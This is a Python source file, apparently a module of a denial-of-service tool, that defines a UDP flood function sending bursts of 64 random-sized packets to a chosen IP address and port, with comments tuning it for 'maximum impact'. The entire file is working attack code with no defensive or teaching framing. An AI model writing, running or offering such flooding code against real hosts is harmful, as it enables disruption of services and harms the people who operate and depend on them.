# Import modules
import socket
from colorama import Fore
import tools.randomData as randomData


# Create socket with optimized options
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# Enable socket reuse to handle rapid packet sending
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


def flood(target: tuple[str, int]) -> None:
    """Send UDP packets to target.
    
    Optimized version with increased packet burst and socket optimization.
    
    Args:
        target: Tuple of (ip_address, port)
    """
    # Increased packet burst for maximum impact
    PACKET_COUNT = 64
    
    for _ in range(PACKET_COUNT):
        try:
            # Generate payload with variable size for diversity
            payload = randomData.random_bytes(1, 512)
            sock.sendto(payload, (target[0], target[1]))
        except PermissionError:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Permission denied. Run as administrator/root.{Fore.RESET}"
            )
            break
        except OSError as e:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Network error while sending UDP: {e}{Fore.RESET}"
            )
        else:
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}UDP packet sent! Payload size: {len(payload)}.{Fore.RESET}"
            )
